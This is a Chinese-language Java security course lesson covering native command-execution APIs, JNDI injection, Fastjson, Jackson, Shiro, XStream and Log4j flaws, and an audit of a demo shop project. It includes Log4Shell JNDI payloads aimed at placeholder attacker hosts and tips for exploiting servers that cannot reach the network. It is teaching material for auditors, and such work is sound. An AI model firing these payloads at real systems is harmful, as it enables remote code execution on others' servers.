#  066：Java原生RCE、JNDI注入与五大不安全组件 🛡️

![](img/2bad90e2b256ef869fe1e32e14f7beeb_1.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_3.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_5.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_7.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_9.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_11.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_13.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_15.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_17.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_19.png)

在本节课中，我们将要学习Java安全中的几个核心知识点。首先，我们会介绍Java中能够实现原生远程代码执行（RCE）的几个关键函数和类。接着，我们将深入探讨JNDI注入的实现原理及其在实战中的应用。最后，也是本节课的重点，我们将详细讲解当前Java安全体系中实战中经常出现的五大不安全组件，了解它们的安全漏洞成因、利用方式以及如何进行黑盒与白盒分析。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_21.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_23.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_25.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_27.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_29.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_31.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_33.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_35.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_37.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_39.png)

## Java原生RCE执行函数与类 🔧

![](img/2bad90e2b256ef869fe1e32e14f7beeb_41.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_43.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_45.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_47.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_49.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_51.png)

上一节我们概述了课程内容，本节中我们来看看Java中实现原生RCE的几个关键函数和类。在PHP中有许多函数可以实现RCE，在Java中同样存在几个能够调用系统命令执行的类和函数。这些漏洞在黑盒测试中的发现思路与PHP类似，主要通过观察URL参数名、文件名和参数值，尝试修改并提交特定的Payload来测试是否存在代码或命令执行点。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_53.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_55.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_56.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_57.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_59.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_61.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_63.png)

以下是Java中实现RCE执行的五个相关类和函数：

![](img/2bad90e2b256ef869fe1e32e14f7beeb_65.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_67.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_69.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_71.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_73.png)

1.  **Runtime.exec()**
    这是Java中最常见的命令执行方式。通过`Runtime.getRuntime().exec(command)`来执行系统命令。
    ```java
    Runtime.getRuntime().exec("calc");
    ```

![](img/2bad90e2b256ef869fe1e32e14f7beeb_75.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_77.png)

2.  **ProcessBuilder.start()**
    `ProcessBuilder`类提供了更灵活的方式来创建操作系统进程。
    ```java
    new ProcessBuilder("calc").start();
    ```

![](img/2bad90e2b256ef869fe1e32e14f7beeb_79.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_81.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_83.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_85.png)

3.  **GroovyShell.evaluate()** (脚本引擎执行)
    通过Groovy等脚本引擎执行代码，间接实现命令执行。
    ```java
    new GroovyShell().evaluate("Runtime.getRuntime().exec('calc')");
    ```

![](img/2bad90e2b256ef869fe1e32e14f7beeb_87.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_89.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_91.png)

4.  **`java.lang.ProcessImpl` (特定平台实现)**
    这是`Runtime.exec()`在Windows等平台下的底层实现，直接调用会触发命令执行。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_93.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_95.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_97.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_99.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_101.png)

5.  **反序列化利用链中的命令执行**
    在各种反序列化漏洞（如Apache Commons Collections）的利用链中，最终会通过上述方式之一执行命令。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_103.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_105.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_107.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_109.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_111.png)

熟悉这些类和函数，有助于在后期进行漏洞审计时，通过全局搜索这些关键词来定位潜在的RCE风险点。黑盒测试主要依靠功能点和参数特征进行猜测，而白盒测试则可以直接在代码中搜索这些危险函数和可控的输入点。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_113.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_115.png)

## JNDI注入原理与应用 🌐

![](img/2bad90e2b256ef869fe1e32e14f7beeb_117.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_119.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_121.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_123.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_125.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_127.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_129.png)

上一节我们介绍了Java原生的RCE执行点，本节中我们来看看JNDI注入。JNDI（Java Naming and Directory Interface）是Java提供的命名和目录接口，它本身不是一个漏洞，而是一项技术。开发人员使用它来查找和访问各种资源（如数据库、远程对象）。其安全问题主要出现在与RMI（远程方法调用）和LDAP（轻量级目录访问协议）结合使用时，可能被利用来触发RCE。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_131.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_133.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_135.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_137.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_139.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_141.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_143.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_145.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_147.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_149.png)

JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远程对象时，如果查找的地址（如RMI或LDAP URL）可控，攻击者可以搭建恶意的RMI或LDAP服务，返回一个包含恶意代码的类。当客户端反序列化并加载这个类时，就会执行攻击者预设的代码。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_151.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_153.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_155.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_157.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_158.png)

以下是JNDI利用中两个关键协议：

![](img/2bad90e2b256ef869fe1e32e14f7beeb_160.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_162.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_164.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_166.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_168.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_170.png)

*   **RMI (Remote Method Invocation)**：Java远程方法调用注册表。
*   **LDAP (Lightweight Directory Access Protocol)**：轻量级目录访问协议。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_172.png)

利用工具（如JNDI-Injection-Exploit）可以快速生成恶意RMI/LDAP服务。使用时，需要根据目标环境的JDK版本选择合适的Payload，因为高版本JDK对JNDI注入有防御限制。

**JDK版本限制参考：**
*   RMI利用受限制版本：≤ JDK 8u113
*   LDAP利用受限制版本：≤ JDK 8u191

![](img/2bad90e2b256ef869fe1e32e14f7beeb_174.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_176.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_178.png)

对于高版本JDK的绕过，通常需要依赖目标环境中存在的其他可利用类（如某些第三方库中的类）进行二次反射调用，这需要更深入的分析。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_180.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_182.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_184.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_186.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_188.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_190.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_192.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_194.png)

简单来说，JNDI是漏洞利用的一个“通道”或“跳板”。我们学习JNDI是为了理解这个通道如何工作，以及如何利用它将其他漏洞（如反序列化）转化为实际的RCE。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_196.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_198.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_200.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_202.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_204.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_206.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_208.png)

## Java五大不安全组件漏洞 🚨

![](img/2bad90e2b256ef869fe1e32e14f7beeb_210.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_212.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_214.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_216.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_218.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_220.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_222.png)

上一节我们探讨了JNDI注入作为利用通道的作用，本节中我们来看看Java安全体系中著名的五大不安全组件。这些组件因其广泛使用和历史漏洞的高危性，在实战中经常成为攻击目标。它们分别是：Fastjson、Jackson、Shiro、XStream和Log4j。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_224.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_226.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_228.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_230.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_232.png)

以下是这五大组件的简要介绍和漏洞特征：

![](img/2bad90e2b256ef869fe1e32e14f7beeb_234.png)

1.  **Fastjson**
    *   **作用**：阿里巴巴出品的高性能JSON解析库。
    *   **漏洞本质**：在反序列化特定构造的JSON字符串时，可导致任意代码执行。
    *   **黑盒特征**：请求/响应体为JSON格式，可能包含`@type`等关键字。属于弱特征，需结合功能点猜测。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_236.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_238.png)

2.  **Jackson**
    *   **作用**：另一个流行的JSON处理库。
    *   **漏洞本质**：与Fastjson类似，反序列化漏洞。
    *   **黑盒特征**：与Fastjson类似，特征不明显，需在接收JSON数据的功能点测试。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_240.png)

3.  **Apache Shiro**
    *   **作用**：强大且易用的Java安全框架，用于身份验证、授权等。
    *   **漏洞本质**：反序列化漏洞（如Shiro-550），利用RememberMe功能的Cookie进行攻击。
    *   **黑盒强特征**：在登录请求的Cookie中存在`rememberMe=xxx`字段。这是非常明显的特征。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_242.png)

4.  **XStream**
    *   **作用**：用于将对象序列化为XML或反向操作的库。
    *   **漏洞本质**：反序列化XML数据时导致RCE。
    *   **黑盒特征**：请求/响应体为XML格式。属于弱特征。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_244.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_246.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_248.png)

5.  **Log4j / Log4j2**
    *   **作用**：Apache的日志记录框架。
    *   **漏洞本质**：最著名的是Log4Shell（CVE-2021-44228），在记录日志时对输入内容进行JNDI查找，导致RCE。
    *   **黑盒测试**：几乎在所有用户输入点尝试插入JNDI Payload（如`${jndi:ldap://attacker.com/a}`），观察是否有DNS或LDAP请求发出。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_250.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_252.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_254.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_256.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_258.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_260.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_262.png)

**漏洞利用与JNDI的关系**：上述许多组件的漏洞利用Payload中，最终执行命令的部分常常会嵌入JNDI Lookup（如`ldap://xxx`），这正是利用了上一节所讲的JNDI机制来加载远程恶意类，从而实现RCE。因此，理解JNDI是理解这些漏洞利用过程的关键。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_264.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_265.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_267.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_269.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_271.png)

**不出网场景下的利用思路**：当目标服务器无法对外发起网络请求（不出网）时，传统的JNDI利用方式会失效。此时可以尝试以下思路：
1.  **DNS查询检测**：使用DNSLog等平台，通过DNS协议判断漏洞是否存在（因为DNS请求通常不会被严格拦截）。
2.  **将执行结果写入本地文件**：通过命令执行将结果写入Web目录下的文件，然后直接访问该文件读取结果。
3.  **将执行结果回显到HTTP响应中**：构造特殊的Payload，让命令执行的结果直接附加在当次HTTP请求的响应包中返回。
4.  **利用目标内网已有服务**：如内网中的LDAP服务进行中转。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_273.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_275.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_277.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_279.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_281.png)

## 实战代码审计案例 🕵️

![](img/2bad90e2b256ef869fe1e32e14f7beeb_283.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_285.png)

上一节我们理论学习了五大不安全组件，本节中我们通过一个实战案例来加深理解。我们将分析一个仿天猫商城的Java项目（tmall），审计其中是否存在不安全组件漏洞。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_287.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_289.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_291.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_293.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_295.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_297.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_299.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_301.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_303.png)

**环境搭建简述：**
1.  使用Maven导入项目依赖。
2.  修改数据库配置，创建数据库并导入SQL文件。
3.  启动Spring Boot项目。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_305.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_307.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_309.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_311.png)

**审计与发现过程：**

![](img/2bad90e2b256ef869fe1e32e14f7beeb_313.png)

1.  **发现Fastjson漏洞**
    *   **代码定位**：全局搜索`JSON.parse`或`JSON.parseObject`，发现`AdminController`中的`addProduct`方法使用了`JSON.parseObject(productParamJson, ...)`。
    *   **版本确认**：查看`pom.xml`，确认Fastjson版本为1.2.58，该版本存在已知反序列化漏洞。
    *   **漏洞验证**：在后台“添加产品”功能处抓包，将请求中的JSON参数替换为包含JNDI Payload的恶意JSON字符串。启动JNDI利用工具监听，观察到工具收到请求并成功执行命令（如弹出计算器），验证漏洞存在。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_315.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_317.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_319.png)

2.  **发现Log4j漏洞**
    *   **代码定位**：全局搜索`log.info`、`log.error`，发现`AdminController`中的文件上传方法里，有`log.info(“获取文件名：” + fileName)`的语句，且`fileName`来自用户可控的上传文件名。
    *   **版本确认**：查看`pom.xml`，确认Log4j版本为1.x，存在漏洞风险（实际Log4Shell主要影响Log4j2，但Log4j1.x也有其他问题，此处仅作演示思路）。
    *   **漏洞验证**：在后台“上传管理员头像”功能处，将上传的文件名改为JNDI Payload（如`${jndi:ldap://your-ldap-server/exp}`）。提交后，观察JNDI工具是否收到请求。**注意**：此漏洞能否成功利用，高度依赖于服务器运行的JDK版本（需低于限制版本）。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_321.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_323.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_325.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_327.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_329.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_331.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_333.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_335.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_337.png)

**审计技巧总结：**
*   **白盒审计**：直接搜索危险函数（如`Runtime.exec`）、危险类库（如`fastjson`、`shiro`）的API调用点，并追溯输入参数是否可控。
*   **黑盒测试**：
    *   **Shiro**：寻找登录功能，检查Cookie中是否有`rememberMe`字段。
    *   **Fastjson/Jackson**：寻找接收JSON数据的功能点（如API接口），尝试插入Payload。
    *   **XStream**：寻找接收XML数据的功能点。
    *   **Log4j**：几乎在所有输入点尝试插入JNDI Payload进行“盲打”。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_339.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_341.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_343.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_345.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_347.png)

## 总结与下节预告 📚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_349.png)

本节课中我们一起学习了Java安全的三个重要部分。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_351.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_353.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_355.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_357.png)

首先，我们回顾了Java中实现原生命令执行的几个核心类和方法，如`Runtime.exec()`和`ProcessBuilder`，这是理解后续漏洞利用的基础。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_359.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_361.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_363.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_365.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_367.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_369.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_371.png)

其次，我们深入探讨了**JNDI注入**。明确了JNDI本身是一项Java技术，但结合RMI或LDAP协议时，可能成为导致RCE的利用通道。我们了解了其利用方式、工具以及高版本JDK的限制。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_373.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_375.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_377.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_378.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_380.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_382.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_384.png)

最后，也是本节课的核心，我们系统性地学习了**Java五大不安全组件**：Fastjson、Jackson、Shiro、XStream和Log4j。我们分析了每个组件的作用、漏洞原理、黑盒识别特征，并理解了它们如何常常与JNDI结合进行漏洞利用。通过一个实战代码审计案例，我们演示了如何发现和验证Fastjson及Log4j相关的漏洞点。

![](img/2bad90e2b256ef869fe1e32e14f7beeb_386.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_388.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_390.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_392.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_394.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_396.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_398.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_400.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_402.png)

下节课，我们将继续深入Java安全领域，学习Java框架漏洞以及反序列化漏洞的更深层知识。